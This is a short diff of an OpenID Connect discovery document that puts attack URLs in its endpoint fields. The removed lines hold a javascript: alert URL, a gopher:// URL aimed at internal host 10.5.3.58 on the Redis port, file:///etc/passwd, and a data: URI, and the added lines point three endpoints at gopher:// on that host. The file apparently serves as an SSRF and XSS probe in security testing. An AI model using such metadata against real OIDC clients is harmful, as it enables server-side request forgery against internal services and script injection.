@@ -1,9 +1,8 @@
 {
  "issuer":"https://zzhou5797-bot.github.io",
- "authorization_endpoint":"javascript:alert('ZZ-AUTH-JS')",
- "token_endpoint":"gopher://10.5.3.58:6379/_ZZ-TOKEN-GOPHER",
- "registration_endpoint":"file:///etc/passwd",
- "jwks_uri":"data:text/plain,ZZ-JWKS-DATA",
+ "authorization_endpoint":"gopher://10.5.3.58:6379/_ZZAUTH",
+ "token_endpoint":"gopher://10.5.3.58:6379/_ZZTOKEN",
+ "registration_endpoint":"gopher://10.5.3.58:6379/_ZZREG",
  "scopes_supported":["openid"],
  "response_types_supported":["code"],
  "grant_types_supported":["authorization_code"],
